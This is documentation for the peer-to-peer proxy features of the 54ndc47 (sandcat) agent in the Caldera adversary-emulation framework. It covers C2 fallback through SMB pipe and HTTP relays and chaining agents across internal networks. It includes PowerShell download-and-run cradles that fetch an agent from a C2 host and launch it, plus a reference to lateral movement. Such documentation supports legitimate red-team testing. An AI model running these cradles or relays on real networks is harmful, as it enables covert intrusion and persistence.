Peer-to-Peer Proxy Functionality for 54ndc47 Agents
================

In certain scenarios, an agent may start on a machine that can't directly connect to the C2 server. 
For instance, agent A may laterally move to a machine that is on an internal network and cannot beacon out to the C2.
By giving agents peer-to-peer capabilities, users can overcome these limitations. Peer-to-peer proxy-enabled agents
can relay messages and act as proxies between the C2 server and peers, giving users more flexibility in their
Caldera operations.

This guide will explain how 54ndc47 incorporates peer-to-peer proxy functionality and how users can include it
in their operations.

## How 54ndc47 Uses Peer-to-Peer

By default, a 54ndc47 agent will try to connect to its defined C2 server using the provided C2 protocol 
(e.g. HTTP). Under ideal circumstances, the requested C2 server is valid and reachable by the agent, and no issues
occur. Because agents cannot guarantee that the requested C2 server is valid, that the requested C2 protocol is
valid and supported by the agent, nor that the C2 server is even reachable, the agent will fall back to
peer-to-peer proxy methods as a backup method. The order of events is as follows:
1. Agent checks if the provided C2 protocol is valid and supported. If not, the agent resorts to peer-to-peer proxy.
2. If the C2 protocol is valid and supported, the agent will try to reach out to the provided C2 server using
that protocol. If the agent gets a successful Beacon, then it continues using the established C2 protocol and server.
If the agent misses 3 Beacons in a row (even after having successfully Beaconed in the past), 
then the agent will fall back to peer-to-peer proxy.

When falling back to peer-to-peer proxy methods, the agent does the following:
1. Search through all known peer proxy receivers and see if any of their protocols are supported.
2. If the agent finds a peer proxy protocol it can use, it will switch its C2 server and C2 protocol to one of
the available corresponding peer proxy locations and the associated peer proxy protocol. 
For example, if an agent cannot successfully make HTTP requests to
the C2 server at `http://10.1.1.1:8080`, but it knows that another agent is proxying peer communications through
an SMB pipe path available at `\\WORKSTATION\pipe\proxypipe`, then the agent will check if it supports SMB Pipe
peer-to-peer proxy capabilities. If so (i.e. if the associated gocat extension was included in the 54ndc47 binary),
then the agent will change its server to `\\WORKSTATION\pipe\proxypipe` and its C2 protocol to `SmbPipe`.

The agent also keeps track of which peer proxy receivers it has tried so far, and it will round-robin through each
one it hasn't tried until it finds one it can use. If the agent cannot use any of the available peer proxy receivers,
or if they happen to all be offline or unreachable, then the agent will pause and try each one again.

### Determining Available Receivers

Since an agent that requires peer-to-peer communication can't reach the C2 server, it needs a way to obtain the
available proxy peer receivers (their protocols and where to find them). Currently, Caldera achieves this by
including available peer receiver information in the dynamically-compiled binaries. When agents hosting peer proxy
receivers check in through a successful beacon to the C2, the agents will include their peer-to-peer proxy receiver 
addresses and corresponding protocols, if any. The C2 server will store this information to later include
in a dynamically compiled binary upon user request.

Users can compile a 54ndc47 binary that includes known available peer-to-peer receivers 
(their protocols and locations), by using the `includeProxyPeers` header when sending the HTTP requests
to the Caldera server for agent binary compilation. In order for a receiver to be included, the agent hosting
the receiver must be trusted, and the peer-to-peer protocol for the receiver must be included in the header
value.

The header value can take one of the following formats:
- `All` : include all available receivers
- `protocol1,protocol2,protocol3` : include only the proxy receivers that follow the requested protocols 
(comma-separated). 
- `!protcol1,protocol2,protocol3` : include all available receivers, EXCEPT those that use the indicated protocols.

By specifying protocols, users have greater control over their agents' communication, especially when they 
do not want particular protocols to appear in the local network traffic.

For example, suppose trusted agents A, B, C are each running HTTP proxy receivers at network addresses
`http://10.1.1.11:8081`, `http://10.1.1.12:8082`, `http://10.1.1.13:8083`, respectively. The peer-to-peer proxy protocol
is `HTTP`. When compiling a binary with the HTTP header `includeProxyPeers:All` or `includeProxyPeers:HTTP`, the
binary will contain all 3 URLs for the agent to use in case it cannot connect to the specified C2.

### Required gocat Extensions

To leverage peer-to-peer functionality, one or more gocat extensions may need to be installed. This can be done
through cradles by including the `gocat-extensions` header when sending HTTP requests to the Caldera server for
dynamic 54ndc47 compilation. The header value will be a comma-separated list of all the desired extensions
(e.g. `proxy_method1,proxy_method2`). If the requested extension is supported and available within the user's current
Caldera installation, then the extension will be included.

### Command Line Options

#### Starting Receivers

To start an agent with peer-to-peer proxy receivers, the `-listenP2P` commandline switch must be used (no
parameters taken). When this switch is set, the agent will activate all supported peer-to-peer proxy receivers.

Example powershell commands to start an agent with HTTP and SMB Pipe receivers:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_http,proxy_smb_pipe"); # Include gocat extensions for the proxy protocols.
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);
C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P;
```

#### Manually Connecting to Peers via Command-Line

In cases where operators know ahead of time that a newly spawned agent cannot directly connect to the C2, 
they can use the existing command-line options for 54ndc47 to have the new agent connect to a peer. 
To do so, the `-c2` and `-server` options  are set to the peer-to-peer proxy protocol and address of the 
peer's proxy receiver, respectively.

For example, suppose trusted agent A is running an SMB pipe proxy receiver at pipe path 
`\\WORKSTATION1\pipe\agentpipe`. Instead of compiling a new agent using the HTTP header `includeProxyPeers:All` or 
`includeProxyPeers:SmbPipe` to include the pipe path information in the binary, operators can simply specify
`-c2 SmbPipe` and `-server \\WORKSTATION1\pipe\agentpipe` in the command to run the agent. Note that in this instance,
the appropriate SMB pipe proxy gocat extension will need to be installed when compiling the agent binaries.

Example powershell commands to start an agent and have it directly connect to a peer's SMB pipe proxy receiver:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_smb_pipe"); # Required extension for SMB Pipe proxy.
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);

# ...
# ... transfer SMB Pipe-enabled binary to new machine via lateral movement technique
# ...

# Run new agent
C:\Users\Public\sandcat.exe -server \\WORKSTATION1\pipe\agentpipe -c2 SmbPipe;
```

### Chaining Peer-to-Peer

In complex circumstances, operators can create proxy chains of agents, where communication with the C2 traverses
several hops through agent peer-to-peer links. The peer-to-peer proxy links do not need to all use the same
proxy protocol. If an agent is running a peer-to-peer proxy receiver via the `-listenP2P` command-line flag,
and if the agent uses peer-to-peer communications to reach the C2 (either automatically or manually), then
the chaining will occur automatically without additional user interaction.

Manual example - run peer proxy receivers, but manually connect to another agent's pipe to communicate with the
C2:
```
C:\Users\Public\sandcat.exe -server \\WORKSTATION1\pipe\agentpipe -listenP2P
```

## Peer-To-Peer Interfaces

At the core of the 54ndc47 peer-to-peer functionality are the peer-to-peer clients and peer-to-peer receivers.
Agents can operate one or both, and can support multiple variants of each.  For instance, an agent that cannot
directly reach the C2 server would run a peer-to-peer client that will reach out to a peer-to-peer receiver running
on a peer agent. Depending on the gocat extensions that each agent supports, an agent could run many different types
of peer-to-peer receivers simultaneously in order to maximize the likelihood of successful proxied peer-to-peer
communication. 

Direct communication between the 54ndc47 agent and the C2 server is defined by the Contact interface in the contact.go
file within the `contact` gocat package. Because all peer-to-peer communication eventually gets proxied to the C2 
server, agents essentially treat their peer proxy receivers as just another server. 

The peer-to-peer proxy receiver functionality is defined in the `P2pReceiver` interface in the proxy.go file
within the `proxy` gocat package. Each implementation requires the following:
- Method to initialize the receiver
- Method to run the receiver itself as a go routine (provide the forwarding proxy functionality)
- Methods to update the upstream server and communication implementation
- Method to cleanly terminate the receiver.
- Method to get the local receiver addresses.

## Current Peer-to-Peer Implementations

### HTTP proxy

The 54ndc47 agent currently supports one peer-to-peer proxy: a basic HTTP proxy. Agents that want to use the HTTP
peer-to-peer proxy can connect to the C2 server via an HTTP proxy running on another agent. Agent A can start an
HTTP proxy receiver (essentially a proxy listener) and forward any requests/responses. Because the nature of an
HTTP proxy receiver implies that the running agent will send HTTP requests upstream, an agent must be using the HTTP
c2 protocol in order to successfully provide HTTP proxy receiver services.

The peer-to-peer HTTP client is the same HTTP implementation of the Contact interface, meaning that an agent simply
needs to use the `HTTP` c2 protocol in order to connect to an HTTP proxy receiver.

In order to run an HTTP proxy receiver, the 54ndc47 agent must have the `proxy_http` gocat extension installed.

#### Example commands:

Compiling and running a 54ndc47 agent that supports HTTP receivers:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); 
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_http");
$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);
C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P
```